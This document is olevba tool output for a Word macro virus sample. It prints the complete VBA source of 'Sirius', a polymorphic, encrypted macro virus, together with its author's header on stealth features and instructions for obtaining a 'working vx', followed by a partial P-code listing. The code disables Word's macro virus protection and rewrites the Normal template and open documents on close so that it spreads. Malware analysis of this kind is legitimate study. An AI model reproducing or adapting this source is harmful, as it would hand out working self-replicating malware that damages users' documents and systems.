olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bius
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bius - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: ./Virus.MSWord.Bius - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'*********************** INFO **************************'
'* Virus Name:  [Sirius]      Version:    [8.04b]      *'
'* Author:      [moebius]                              *'
'* Infect on:   [Class: Document_Close              ]  *'
'* Decrypt on:  [Class: Document_Open, Document_New ]  *'
'*              [Module: AutoOpen, AutoExec, AutoNew]  *'
'*              [FileOpen, FileSave, FileSaveAs     ]  *'
'********************** METHODS ************************'
'* Anti-Heuristic:...[Y]  Class:...[Y]   Encrypted:.[Y]*'
'* Polymorphic:......[Y]  Stealth:.[Y]   Retro:.....[N]*'
'* E-Mail Infection..[N]  mIRC:....[N]   VBScript:..[N]*'
'* TXT Crypt/Decrypt:[N]  Payload:.[N];) BackDoor:..[N]*'
'* Optimized:........[Y]  Anti-Lamer CRC............[N]*'
'* Infect On Fly.....[N]                               *'
'******************* POLY METHODS **********************'
'* SubScore Method:..[Y]   Goto RndLine Method.....[Y] *'
'* Variable Method:..[Y]   Rnd Key Encrypt Method:.[Y] *'
'*!Insert REM Method:[Y]   Screw Offsets Method:...[Y] *'
'* Screw Numbers.....[Y] !!Insert Working Code:....[Y] *'
'*!Random U/LCase....[Y]   DecryptOn Method:.......[Y] *'
'* Random Sub Name...[Y]   mIRC DCC Poly:..........[N] *'
'* E-Mail Msg Poly:..[N]                               *'
'* !  - Dont know if it do any good but it is cute ;)  *'
'* !! -AIWC engine is at version 1.96! (wait 2.00;)    *'
'********************** WHATS NEW? *********************'
'* I think I can make AV for this  virus !             *'
'* I will do some major changes, and try to make       *'
'* all those simple functions in decoder to "little"   *'
'* more complex functions ;)                           *'
'* And bye the way, hmvs still doesnt scan anything, so*'
'* i guess they didnt get Sirius yet (or maybe they    *'
'* DID ;)                                              *'
'**************** USING IT (read license)***************'
'* Fill this TXT file into Word! U must fill 1st gen.  *'
'* source into opened document, not into normal.dot ;) *'
'* Then run it and after it executes undo it until u   *'
'* get again 1st gen source and then run it again! You *'
'* will get working vx (read license)!                 *'
'********************** LICENSE ************************'
'* Use of this source is at your own risk! I don't take*'
'*  any responsibility! Source is in plane TXT and is  *'
'*  -UNABLE- (in this form) to spread! I seriusly dont *'
'*        recomend loading this TEXT into word.        *'
'******************** USER FRIENDLY ********************'
'*  When vx is 1st time executed, it will remove all   *'
'*   commented lines, without triggering checksum ;)   *'
'********************** CREDITS ************************'
'* Lord_Arz - Sirius was born from his virus Unseen or *'
'*            better - virus is based on unseen, poly  *'
'*            is completly my work                     *'
'* Hi to all on #virus and all other virus channels!   *'
'*******************************************************'
'* E-Mail:       m.o.e.b.i.u.s@usa.net                 *'
'* IRC   :       #vir                                  *'
'*******************************************************'
Private Sub DOCUMENT_CLOSE()
On Error Resume Next
MOEBIUS:
Randomize Timer
Options.VirusProtection = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
GI = 8: GJ = 10: GR = 2: NX = 24: GL = 2: LO = 5
X9 = Chr(34): C = Chr(13): CC = Chr(34)
O2 = NORMAL.ThisDocument.Variables(1).Value
O3 = ActiveDocument.Variables(1).Value
'moebius
If Len(O2) > 8000 Or O4 > 18 Then
O5 = 1
Do While Not Mid(O2, Len(O2) - O4, 1) = "'"
O4 = O4 + 1
O7 = Right(O2, O4)
Loop
End If
L = Int(1 * 2)
If Len(O3) > 8000 Or O8 > 18 Then
O6 = 1
Do While Not Mid(O3, Len(O3) - O8, 1) = "'"
O8 = O8 + 1
O9 = Right(O3, O8)
Loop
End If
Set N1 = ActiveDocument.VBProject.VBCOMPONENTS(1).CODEMODULE
Set N2 = NormalTemplate.VBProject.VBCOMPONENTS(1).CODEMODULE
NI = N2.LINES(103, 1)
AI = N1.LINES(103, 1)
If Right(NI, 8) = "MOEBIUS:" Or NI = "Set N6 = N1" Then N3 = 1
If Right(AI, 8) = "MOEBIUS:" Or AI = "Set N6 = N1" Then N4 = 1
If N3 = 0 Then
Set N5 = N2
Set N6 = N1
Else
Set N5 = N1
Set N6 = N2
End If
For W = 1 To 100
N8 = N8 + C
Next W
If O5 = 1 Then V0 = O7: NE = O2: GoTo 9
With N6
For X = 1 To .COUNTOFLINES - 1
N7 = .LINES(X, 1)
If Left(N7, 1) = "'" Then GoTo 0
N8 = N8 & N7 & C
N9 = Int(5 * Rnd + 1)
If N9 = GR And X > 3 Then GoSub NA: U2 = "'" & NB & C: N8 = N8 & U2: U4 = U4 + Len(U2)
0 Next X
N8 = UCase(N8) & "END SUB" & C & "'"
RZ = Len(N8) - U4
End With
GoSub O1: V0 = NB
Do While Not Len(N8) = Len(NE)
Q = Q + 1
H = H + 1
NF = Mid(N8, Q, 1)
H1 = Mid(V0, H, 1)
NG = Chr(Asc(NF) + Asc(H1))
If H = Len(V0) Then H = 0
NE = NE + NG
Loop
NE = NE + "'" + V0
9 LO = 5
GoSub NA: J1 = NB: GoSub NA: J2 = NB: GoSub NA: J3 = NB
GoSub NA: J4 = NB: GoSub NA: J5 = NB: GoSub NA: J6 = NB
GoSub NA: J9 = NB: GoSub NA: JA = NB: GoSub NA: JB = NB
GoSub NA: JC = NB: GoSub NA: JD = NB: GoSub NA: JE = NB
GoSub NA: JF = NB: GoSub NA: JG = NB: GoSub NA: JH = NB
GoSub NA: JI = NB: GoSub NA: JJ = NB: GoSub NA: JK = NB
GoSub NA: JL = NB: GoSub NA: VX = M: GoSub NA: JM = NB
GoSub NA: V1 = NB: GoSub NA: V2 = NB: GoSub NA: V3 = NB
GoSub NA: Q1 = NB: GoSub NA: Q2 = NB: GoSub NA: Q3 = NB
GoSub NA: W1 = NB: GoSub NA: W2 = NB: GoSub NA: W3 = NB
GoSub NA: V4 = NB: GoSub NA: V5 = NB: GoSub NA: V6 = NB
GoSub NA: V7 = NB: GoSub NA: V8 = NB: GoSub NA: V9 = NB
GoSub NA: VA = NB: GoSub NA: VB = NB: GoSub NA: VC = NB
GoSub NA: NK = NB: GoSub NA: JZ = NB: GoSub NA: JV = NB
GoSub NA: TA = NB: GoSub NA: TB = NB: GoSub NA: TC = NB
GoSub NA: TD = NB: GoSub NA: TX = NB: GoSub NA: T4 = NB
GoSub NA: T5 = NB: GoSub NA: T6 = NB: GoSub NA: T7 = NB
GoSub NA: T8 = NB: WL = 10915: GoSub NA: T9 = NB
GoSub NA: JW = NB: NN = NC: GoSub NA: JX = NB: NN = 1
GoSub F1: R0 = F2: GoSub F1: RA = F2: GoSub F1: RB = F2
GoSub F1: RC = F2: GoSub F1: RD = F2: GoSub F1: RE = F2
GoSub F1: RF = F2: GoSub F1: RG = F2: GoSub F1: RH = F2
GoSub F1: RI = F2: NN = 0: GoSub F1: RJ = F2
For M1 = 1 To Len(VX): WW = WW + Asc(Mid(VX, M1, 1)): Next M1
GoTo NW
NA:
NB = Chr(Int(26 * Rnd + 65))
NL = Int((15 - LO) * Rnd + LO)
Do While Not Len(NB) = NL
6 NM = Int((122 - 48 + 1) * Rnd + 48)
If NM > 57 And NM < 65 Then GoTo 6
If NM > 90 And NM < 97 Then GoTo 6
NB = NB + Chr$(NM)
Loop
Return
O1:
NB = Chr(Int(26 * Rnd + 65))
NL = Int((15 - LO) * Rnd + LO)
Do While Not Len(NB) = NL
NM = Int((90 - 65 + 1) * Rnd + 65)
NB = NB + Chr$(NM)
Loop
Return
F1:
NH = Int(1000000 * Rnd + 999)
F3 = Int((2 - 1 + 1) * Rnd + 1)
If F3 = 1 Then NJ = NH + NN: F6 = " - " Else NJ = NN - NH: F6 = " + "
F3 = Int((2 - 1 + 1) * Rnd + 1)
If F3 = 1 Then F4 = "(": F5 = ")" Else: F4 = "": F5 = ""
F3 = Int((3 - 1 + 1) * Rnd + 1)
If F3 = 1 Then F2 = NN Else: F2 = F4 & NJ & F6 & NH & F5
Return
NU:
S = Int(3 * Rnd + 1)
If S = 1 Then NO = "= "
If S = 2 Then NO = "> "
If S = 3 Then NO = "< "
Return
NV:
XZ = ""
NZ = ""
For XA = 1 To Int((GI - 1 + 1) * Rnd + 1)
GoSub X2
XZ = XZ + C + NZ
Next XA
NZ = XZ
Return
X2:
GoSub NA: NS = NB
GoSub NA: NT = NB
NN = Int((10000 - 100 + 1) * Rnd + 100)
GoSub F1
X1 = F2
NN = Int((10000 - 100 + 1) * Rnd + 100)
GoSub F1
GoSub NU
F7 = Int((20 - 1 + 1) * Rnd + 1)
S = Int(3 * Rnd + 1)
E2 = Int(30 * Rnd + 1)
E3 = Int(29 * Rnd + 1)
If E4 = 1 Then E5 = "$" Else E5 = ""
E6 = Int(255 * Rnd + 1)
If S = 1 Then S1 = "+ "
If S = 2 Then S1 = "- "
If F7 = 1 Then NZ = "IF " & NS & NO & NJ & " THEN " & NT & "= " & NH & C1
If F7 = 2 Then NZ = "IF " & NS & NO & F2 & " THEN " & NT & "= " & X1 & C1
If F7 = 3 Then NZ = NS & " = " & NS & S1 & X1 & C1
If F7 = 4 Then NZ = NS & " = " & NT & S1 & X1 & C1
If F7 = 5 Then NZ = NS & " = " & F2 & S1 & X1 & C1
If F7 = 6 Then NZ = NS & " = " & X1 & C1
If F7 = 7 Then NZ = NS & " = " & X9 & NT & X9 & C1
If F7 = 8 Then NZ = NS & " = " & X9 & NS & X9 & "+ " & NT & C1
If F7 = 9 Then G3 = Int(2 * Rnd + 1): If G3 = 1 Then LW = "REM " Else LW = "' ": NZ = LW & NS & NT
If F7 = 10 Then NZ = NS & " = UCASE(" & X9 & NT & X9 & ")" & C1
If F7 = 11 Then NZ = NS & " = LCASE(" & X9 & NT & X9 & ")" & C1
If F7 = 12 Then NZ = NS & " = LEN(" & X9 & NT & X9 & ")" & C1
If F7 = 13 Then NZ = NS & " = LEN(" & NT & ")" & C1
If F7 = 14 Then GoSub MATHFFUNCT: NZ = NS & " =" & MATHF & "(" & NT & ")" & C1
If F7 = 15 Then NZ = NS & " = MID" & E5 & "(" & NT & "," & E2 & "," & E3 & " )" & C1
If F7 = 16 Then NZ = NS & " = LEFT" & E5 & "(" & NT & "," & E2 & ")" & C1
If F7 = 17 Then NZ = NS & " = RIGHT" & E5 & "(" & NT & "," & E2 & ")" & C1
If F7 = 18 Then NZ = NS & " = STRING" & E5 & "(" & NT & "," & E6 & ")" & C1
If F7 = 19 Then NZ = NS & " = CHR(" & E6 & ")" & C1
If F7 = 20 Then NZ = NS & " = ASC(" & X9 & Chr(E6) & X9 & ")" & C1
Return
MATHFFUNCT:
E4 = Int((2 - 1 + 1) * Rnd + 1)
E1 = Int((18 - 1 + 1) * Rnd + 1)
If E1 = 1 Then MATHF = "ABS"
If E1 = 2 Then MATHF = "ATN"
If E1 = 3 Then MATHF = "COS"
If E1 = 4 Then MATHF = "SIN"
If E1 = 5 Then MATHF = "INT"
If E1 = 6 Then MATHF = "FIX"
If E1 = 7 Then MATHF = "RND"
If E1 = 8 Then MATHF = "SGN"
If E1 = 9 Then MATHF = "SQR"
If E1 = 10 Then MATHF = "TAN"
If E1 = 11 Then MATHF = "STR" + E5
If E1 = 12 Then MATHF = "OCT" + E5
If E1 = 13 Then MATHF = "SPACE" + E5
If E1 = 14 Then MATHF = "STR" + E5
If E1 = 15 Then MATHF = "LTRIM" + E5
If E1 = 16 Then MATHF = "RTRIM" + E5
If E1 = 17 Then MATHF = "TRIM" + E5
If E1 = 18 Then MATHF = "HEX" + E5
Return
F8:
F9 = ""
G1 = ""
G2 = ""
G1 = Int((2 - 1 + 1) * Rnd + 1)
If G1 = 1 Then G4 = C & " GOTO " Else G4 = C & " GOSUB "
G1 = Int((2 - 1 + 1) * Rnd + 1)
If G1 = 1 Then GoSub NV: G5 = NZ Else G5 = ":"
F9 = G5 + G4
G1 = Int((2 - 1 + 1) * Rnd + 1)
If G1 = 1 Then GoSub NV: G2 = NZ & C Else G2 = " "
Return
2 J = 0
'If WW = WZ Then NX = NX - 1
NX = NX - 1
I = Int(NX * Rnd + 1)
NQ = Int(2 * Rnd + 1)
NN = Int(99 * Rnd + 1)
If NX = 0 Then
GoSub NV
K = K & NZ
GoSub F8
GoTo 1
End If
If NQ = 1 And NX > 0 Then
GoSub NV
K = K & NZ
End If
GoSub F8
GoTo 1
NW:
GoSub F8
WZ = WL * 2
CH = Int(2 * Rnd + 1)
If CH = 1 Then K = "PRIVATE SUB DOCUMENT_OPEN() " & F9 & JW
If CH = 2 Then K = "PRIVATE SUB DOCUMENT_NEW() " & F9 & JW
'just sample! for nice stealth i throw out every "SUB ..."!
'If CH = 3 Then K = "SUB AUTOOPEN() " & F9 & JW
'If CH = 4 Then K = "SUB AUTOEXEC() " & F9 & JW
'If CH = 5 Then K = "SUB AUTONEW() " & F9 & JW
'If CH = 6 Then K = "SUB FILEOPEN() " & F9 & JW
'If CH = 7 Then K = "SUB FILESAVE() " & F9 & JW
'If CH = 8 Then K = "SUB FILESAVEAS() " & F9 & JW
GoTo 2
Do While Not NX = 0
C = ""
'if anyone have any idea how to write this block little shorter
'then plz do it. send me a sample!
1 If A1 = 0 Then J = J + 1: If J = I Then A1 = 1: K = K & C & JW & ":" & G2 & V6 & "= THISDOCUMENT.VBPROJECT.VBCOMPONENTS(" & RA & ").CODEMODULE.COUNTOFLINES" & F9 & J2: GoTo 2
If A2 = 0 Then J = J + 1: If J = I Then A2 = 1: K = K & C & J2 & ":" & G2 & "THISDOCUMENT.VBPROJECT.VBCOMPONENTS( " & RB & ").CODEMODULE.DELETELINES ( " & RC & "), " & V6 & "" & F9 & J3: GoTo 2
If A3 = 0 Then J = J + 1: If J = I Then A3 = 1: K = K & C & J3 & ":" & G2 & V1 & "= THISDOCUMENT.VARIABLES(" & R0 & ").VALUE" & F9 & Q1: GoTo 2
If D1 = 0 Then J = J + 1: If J = I Then D1 = 1: K = K & C & Q1 & ":" & G2 & W1 & "=LEN( " & V3 & ")" & F9 & Q2: GoTo 2
If D2 = 0 Then J = J + 1: If J = I Then D2 = 1: K = K & C & Q2 & ":" & G2 & W2 & "= LEN( " & V1 & ")" & F9 & Q3: GoTo 2
If D3 = 0 Then J = J + 1: If J = I Then D3 = 1: K = K & C & Q3 & ":" & G2 & W3 & "= LEN( " & CC & V0 & CC & ")" & F9 & J4: GoTo 2
If A4 = 0 Then J = J + 1: If J = I Then A4 = 1: K = K & C & J4 & ":" & G2 & "IF " & W1 & "= " & W2 & "-" & W3 & " THEN GOTO " & JL & " ELSE " & F9 & J5: GoTo 2
If A5 = 0 Then J = J + 1: If J = I Then A5 = 1: K = K & C & J5 & ":" & G2 & V5 & "= " & V5 & "+ " & RD & F9 & JI: GoTo 2
If AC = 0 Then J = J + 1: If J = I Then AC = 1: K = K & C & JI & ":" & G2 & V8 & "= " & V8 & " + " & RI & F9 & J6: GoTo 2
If A6 = 0 Then J = J + 1: If J = I Then A6 = 1: K = K & C & J6 & ":" & G2 & V2 & "= MID( " & V1 & ", " & V5 & "," & RE & ")" & F9 & TA: GoTo 2
If TH = 0 Then J = J + 1: If J = I Then TH = 1: K = K & C & TA & ":" & G2 & T4 & "= UCASE(" & CC & V0 & CC & ")" & F9 & JJ: GoTo 2
If AD = 0 Then J = J + 1: If J = I Then AD = 1: K = K & C & JJ & ":" & G2 & V9 & "= MID(" & T4 & ", " & V8 & ", " & RH & ")" & F9 & TB: GoTo 2
If TI = 0 Then J = J + 1: If J = I Then TI = 1: K = K & C & TB & ":" & G2 & T5 & "= LEN( " & CC & V0 & CC & ")" & F9 & JK: GoTo 2
If AE = 0 Then J = J + 1: If J = I Then AE = 1: K = K & C & JK & ":" & G2 & "IF " & V8 & "= " & T5 & " THEN " & V8 & "= " & RJ & ": GOTO " & TC & " ELSE " & F9 & TC: GoTo 2
If TJ = 0 Then J = J + 1: If J = I Then TJ = 1: K = K & C & TC & ":" & G2 & T6 & "= ASC( " & V2 & ")" & F9 & TD: GoTo 2
If TK = 0 Then J = J + 1: If J = I Then TK = 1: K = K & C & TD & ":" & G2 & T7 & "= ASC( " & V9 & ")" & F9 & J9: GoTo 2
If AF = 0 Then J = J + 1: If J = I Then AF = 1: K = K & C & J9 & ":" & G2 & VB & "= " & T6 & "- " & T7 & F9 & TX: GoTo 2
If TL = 0 Then J = J + 1: If J = I Then TL = 1: K = K & C & TX & ":" & G2 & T8 & "= ABS(" & VB & ")" & F9 & JM: GoTo 2
If A7 = 0 Then J = J + 1: If J = I Then A7 = 1: K = K & C & JM & ":" & G2 & V4 & "= CHR(" & T8 & ")" & F9 & JA: GoTo 2
If A8 = 0 Then J = J + 1: If J = I Then A8 = 1: K = K & C & JA & ":" & G2 & V3 & "= " & V3 & "+ " & V4 & F9 & JB: GoTo 2
If A9 = 0 Then J = J + 1: If J = I Then A9 = 1: K = K & C & JB & ":" & G2 & F9 & Q1: GoTo 2
If TM = 0 Then J = J + 1: If J = I Then TM = 1: K = K & C & JL & ":" & G2 & T9 & "= " & CC & NK & CC & F9 & JX: GoTo 2
If AA = 0 Then J = J + 1: If J = I Then AA = 1: K = K & C & JX & ":" & G2 & "THISDOCUMENT.VBPROJECT.VBCOMPONENTS( " & RF & ").CODEMODULE.INSERTLINES " & RG & ", " & V3 & "" & F9 & JD: GoTo 2
Loop
GoSub F8
K = K & C & JD & ":" & G2 & C & " END SUB" & C
Do While Not Len(K) <= TE
TE = TE + 1
TT = Mid(K, TE, 1)
If TT = " " Or TT = "." Or TT = "," Or TT = "(" Or TT = ")" Or TT = ":" Or TT = ">" Or TT = "<" Or TT = "=" Or TT = "+" Or TT = "-" Or TT = "*" Then If Int(GJ * Rnd + 1) = 1 Then K1 = K1 + " _" + C: GoTo 4
If TT = Chr(13) And TE < Len(K) Then If Int((GL - 1 + 1) * Rnd + 1) = 1 Then GoSub NA: K1 = K1 & C & NB & ": ": If Mid(K, TE + 1, 1) = C Then TE = TE + 1: GoTo 4
G6 = Int((2 - 1 + 1) * Rnd + 1)
If G6 = 1 Then TT = UCase(TT) Else TT = LCase(TT)
4 K1 = K1 + TT
Loop
With NORMAL.ThisDocument.VBProject.VBCOMPONENTS(1).CODEMODULE
.DELETELINES 1, .COUNTOFLINES
.INSERTLINES 1, N8 + K1
End With
With ThisDocument.VBProject.VBCOMPONENTS(1).CODEMODULE
.DELETELINES 1, .COUNTOFLINES
.INSERTLINES 1, N8 + K1
End With
DoEvents
If O9 = O7 And Len(O9) > 0 Then End
If O5 <> 1 Then NORMAL.ThisDocument.Variables.Add 1, NE
If O6 <> 1 Then ActiveDocument.Variables.Add 1, NE
If O5 <> 1 And O6 <> 1 Then NORMAL.ThisDocument.Variables.Add 1, NE: ActiveDocument.Variables.Add 1, NE
ActiveDocument.Save
NormalTemplate.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Bius
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul 1 - 28196 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0038 "*********************** INFO **************************'"
' Line #1:
' 	QuoteRem 0x0000 0x0038 "* Virus Name:  [Sirius]      Version:    [8.04b]      *'"
' Line #2:
' 	QuoteRem 0x0000 0x0038 "* Author:      [moebius]                              *'"
' Line #3:
' 	QuoteRem 0x0000 0x0038 "* Infect on:   [Class: Document_Close              ]  *'"
' Line #4:
' 	QuoteRem 0x0000 0x0038 "* Decrypt on:  [Class: Document_Open, Document_New ]  *'"
' Line #5:
' 	QuoteRem 0x0000 0x0038 "*              [Module: AutoOpen, AutoExec, AutoNew]  *'"
' Line #6:
' 	QuoteRem 0x0000 0x0038 "*              [FileOpen, FileSave, FileSaveAs     ]  *'"
' Line #7:
' 	QuoteRem 0x0000 0x0038 "********************** METHODS ************************'"
' Line #8:
' 	QuoteRem 0x0000 0x0038 "* Anti-Heuristic:...[Y]  Class:...[Y]   Encrypted:.[Y]*'"
' Line #9:
' 	QuoteRem 0x0000 0x0038 "* Polymorphic:......[Y]  Stealth:.[Y]   Retro:.....[N]*'"
' Line #10:
' 	QuoteRem 0x0000 0x0038 "* E-Mail Infection..[N]  mIRC:....[N]   VBScript:..[N]*'"
' Line #11:
' 	QuoteRem 0x0000 0x0038 "* TXT Crypt/Decrypt:[N]  Payload:.[N];) BackDoor:..[N]*'"
' Line #12:
' 	QuoteRem 0x0000 0x0038 "* Optimized:........[Y]  Anti-Lamer CRC............[N]*'"
' Line #13:
' 	QuoteRem 0x0000 0x0038 "* Infect On Fly.....[N]                               *'"
' Line #14:
' 	QuoteRem 0x0000 0x0038 "******************* POLY METHODS **********************'"
' Line #15:
' 	QuoteRem 0x0000 0x0038 "* SubScore Method:..[Y]   Goto RndLine Method.....[Y] *'"
' Line #16:
' 	QuoteRem 0x0000 0x0038 "* Variable Method:..[Y]   Rnd Key Encrypt Method:.[Y] *'"
' Line #17:
' 	QuoteRem 0x0000 0x0038 "*!Insert REM Method:[Y]   Screw Offsets Method:...[Y] *'"
' Line #18:
' 	QuoteRem 0x0000 0x0038 "* Screw Numbers.....[Y] !!Insert Working Code:....[Y] *'"
' Line #19:
' 	QuoteRem 0x0000 0x0038 "*!Random U/LCase....[Y]   DecryptOn Method:.......[Y] *'"
' Line #20:
' 	QuoteRem 0x0000 0x0038 "* Random Sub Name...[Y]   mIRC DCC Poly:..........[N] *'"
' Line #21:
' 	QuoteRem 0x0000 0x0038 "* E-Mail Msg Poly:..[N]                               *'"
' Line #22:
' 	QuoteRem 0x0000 0x0038 "* !  - Dont know if it do any good but it is cute ;)  *'"
' Line #23:
' 	QuoteRem 0x0000 0x0038 "* !! -AIWC engine is at version 1.96! (wait 2.00;)    *'"
' Line #24:
' 	QuoteRem 0x0000 0x0038 "********************** WHATS NEW? *********************'"
' Line #25:
' 	QuoteRem 0x0000 0x0038 "* I think I can make AV for this  virus !             *'"
' Line #26:
' 	QuoteRem 0x0000 0x0038 "* I will do some major changes, and try to make       *'"
' Line #27:
' 	QuoteRem 0x0000 0x0038 "* all those simple functions in decoder to "little"   *'"
' Line #28:
' 	QuoteRem 0x0000 0x0038 "* more complex functions ;)                           *'"
' Line #29:
' 	QuoteRem 0x0000 0x0038 "* And bye the way, hmvs still doesnt scan anything, so*'"
' Line #30:
' 	QuoteRem 0x0000 0x0038 "* i guess they didnt get Sirius yet (or maybe they    *'"
' Line #31:
' 	QuoteRem 0x0000 0x0038 "* DID ;)                                              *'"
' Line #32:
' 	QuoteRem 0x0000 0x0038 "**************** USING IT (read license)***************'"
' Line #33:
' 	QuoteRem 0x0000 0x0038 "* Fill this TXT file into Word! U must fill 1st gen.  *'"
' Line #34:
' 	QuoteRem 0x0000 0x0038 "* source into opened document, not into normal.dot ;) *'"
' Line #35:
' 	QuoteRem 0x0000 0x0038 "* Then run it and after it executes undo it until u   *'"
' Line #36:
' 	QuoteRem 0x0000 0x0038 "* get again 1st gen source and then run it again! You *'"
' Line #37:
' 	QuoteRem 0x0000 0x0038 "* will get working vx (read license)!                 *'"
' Line #38:
' 	QuoteRem 0x0000 0x0038 "********************** LICENSE ************************'"
' Line #39:
' 	QuoteRem 0x0000 0x0038 "* Use of this source is at your own risk! I don't take*'"
' Line #40:
' 	QuoteRem 0x0000 0x0038 "*  any responsibility! Source is in plane TXT and is  *'"
' Line #41:
' 	QuoteRem 0x0000 0x0038 "*  -UNABLE- (in this form) to spread! I seriusly dont *'"
' Line #42:
' 	QuoteRem 0x0000 0x0038 "*        recomend loading this TEXT into word.        *'"
' Line #43:
' 	QuoteRem 0x0000 0x0038 "******************** USER FRIENDLY ********************'"
' Line #44:
' 	QuoteRem 0x0000 0x0038 "*  When vx is 1st time executed, it will remove all   *'"
' Line #45:
' 	QuoteRem 0x0000 0x0038 "*   commented lines, without triggering checksum ;)   *'"
' Line #46:
' 	QuoteRem 0x0000 0x0038 "********************** CREDITS ************************'"
' Line #47:
' 	QuoteRem 0x0000 0x0038 "* Lord_Arz - Sirius was born from his virus Unseen or *'"
' Line #48:
' 	QuoteRem 0x0000 0x0038 "*            better - virus is based on unseen, poly  *'"
' Line #49:
' 	QuoteRem 0x0000 0x0038 "*            is completly my work                     *'"
' Line #50:
' 	QuoteRem 0x0000 0x0038 "* Hi to all on #virus and all other virus channels!   *'"
' Line #51:
' 	QuoteRem 0x0000 0x0038 "*******************************************************'"
' Line #52:
' 	QuoteRem 0x0000 0x0038 "* E-Mail:       m.o.e.b.i.u.s@usa.net                 *'"
' Line #53:
' 	QuoteRem 0x0000 0x0038 "* IRC   :       #vir                                  *'"
' Line #54:
' 	QuoteRem 0x0000 0x0038 "*******************************************************'"
' Line #55:
' 	FuncDefn (Private Sub DOCUMENT_CLOSE())
' Line #56:
' 	OnError (Resume Next) 
' Line #57:
' 	Label MOEBIUS 
' Line #58:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #61:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #62:
' 	LitDI2 0x0008 
' 	St GI 
' 	BoS 0x0000 
' 	LitDI2 0x000A 
' 	St GJ 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	St GR 
' 	BoS 0x0000 
' 	LitDI2 0x0018 
' 	St NX 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	St GL 
' 	BoS 0x0000 
' 	LitDI2 0x0005 
' 	St LO 
' Line #63:
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	St X9 
' 	BoS 0x0000 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	St C 
' 	BoS 0x0000 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	St CC 
' Line #64:
' 	LitDI2 0x0001 
' 	Ld NORMAL 
' 	MemLd ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	MemLd Value 
' 	St O2 
' Line #65:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Variables 0x0001 
' 	MemLd Value 
' 	St O3 
' Line #66:
' 	QuoteRem 0x0000 0x0007 "moebius"
' Line #67:
' 	Ld O2 
' 	FnLen 
' 	LitDI2 0x1F40 
' 	Gt 
' 	Ld O4 
' 	LitDI2 0x0012 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #68:
' 	LitDI2 0x0001 
' 	St O5 
' Line #69:
' 	Ld O2 
' 	Ld O2 
' 	FnLen 
' 	Ld O4 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	DoWhile 
' Line #70:
' 	Ld O4 
' 	LitDI2 0x0001 
' 	Add 
' 	St O4 
' Line #71:
' 	Ld O2 
' 	Ld O4 
' 	ArgsLd Right 0x0002 
' 	St O7 
' Line #72:
' 	Loop 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St L 
' Line #75:
' 	Ld O3 
' 	FnLen 
' 	LitDI2 0x1F40 
' 	Gt 
' 	Ld O8 
' 	LitDI2 0x0012 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #76:
' 	LitDI2 0x0001 
' 	St O6 
' Line #77:
' 	Ld O3 
' 	Ld O3 
' 	FnLen 
' 	Ld O8 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	DoWhile 
' Line #78:
' 	Ld O8 
' 	LitDI2 0x0001 
' 	Add 
' 	St O8 
' Line #79:
' 	Ld O3 
' 	Ld O8 
' 	ArgsLd Right 0x0002 
' 	St O9 
' Line #80:
' 	Loop 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	Set N1 
' Line #83:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	Set N2 
' Line #84:
' 	LitDI2 0x0067 
' 	LitDI2 0x0001 
' 	Ld N2 
' 	ArgsMemLd LINES 0x0002 
' 	St NI 
' Line #85:
' 	LitDI2 0x0067 
' 	LitDI2 0x0001 
' 	Ld N1 
' 	ArgsMemLd LINES 0x0002 
' 	St AI 
' Line #86:
' 	Ld NI 
' 	LitDI2 0x0008 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0008 "MOEBIUS:"
' 	Eq 
' 	Ld NI 
' 	LitStr 0x000B "Set N6 = N1"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St N3 
' 	EndIf 
' Line #87:
' 	Ld AI 
' 	LitDI2 0x0008 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0008 "MOEBIUS:"
' 	Eq 
' 	Ld AI 
' 	LitStr 0x000B "Set N6 = N1"
' 	Eq 
